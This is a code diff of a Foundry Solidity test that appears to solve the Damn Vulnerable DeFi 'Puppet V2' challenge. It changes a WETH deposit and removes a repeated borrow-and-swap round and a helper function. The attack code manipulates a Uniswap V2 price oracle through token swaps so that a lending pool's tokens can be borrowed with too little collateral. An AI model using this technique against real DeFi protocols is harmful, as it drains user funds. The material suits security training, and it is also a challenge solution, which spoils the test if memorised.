@@ -118,7 +118,7 @@ contract PuppetV2 is Test {
         weth.approve(address(puppetV2Pool), MAX_INT);
         dvt.approve(address(uniswapV2Router), MAX_INT);
 
-        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE - 1 ether}();
+        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE - 0.01 ether}();
 
         uint256 amountOutMin = getAmountOut();
 
@@ -132,27 +132,6 @@ contract PuppetV2 is Test {
         
         uint256 maxBorrow = dvt.balanceOf(address(puppetV2Pool));
         uint256 depositNeeded = puppetV2Pool.calculateDepositOfWETHRequired(maxBorrow);
-        maxBorrow = weth.balanceOf(attacker) < depositNeeded ? maxBorrow * 
-            weth.balanceOf(attacker) / depositNeeded : maxBorrow;
-
-        console2.log("borrow amount %s", maxBorrow);
-        console2.log("deposit needed %s", depositNeeded);
-        console2.log("attacker weth balance %s", weth.balanceOf(attacker));
-
-        puppetV2Pool.borrow(maxBorrow);
-
-        amountOutMin = getAmountOut();
-
-        uniswapV2Router.swapExactTokensForTokens(
-            dvt.balanceOf(attacker),
-            amountOutMin,
-            path,
-            attacker,
-            block.timestamp + 1 hours
-        );
-
-        maxBorrow = dvt.balanceOf(address(puppetV2Pool));
-        depositNeeded = puppetV2Pool.calculateDepositOfWETHRequired(maxBorrow);
         maxBorrow = weth.balanceOf(attacker) < depositNeeded ? maxBorrow * 
             weth.balanceOf(attacker) / depositNeeded : maxBorrow;
 
@@ -188,18 +167,6 @@ contract PuppetV2 is Test {
         return amountOut;
     }
 
-    function getAmountIn() internal returns (uint256 amountIn) {
-        uint256 deposit = weth.balanceOf(attacker);
-        uint256 quote = deposit / 3;
-        (uint256 resWETH, uint256 resToken) = UniswapV2Library.getReserves(
-            address(uniswapV2Factory), address(weth), address(dvt)
-        );
-        uint256 amountIn = (quote * resWETH) / resToken;
-        console2.log("[resWeth %s] [resToken %s]", resWETH, resToken);
-        console2.log("[deposit %s] [quote %s] [amountIn %s]", 
-            deposit, quote, amountIn);
-        return amountIn;
-    }
 
     
 }
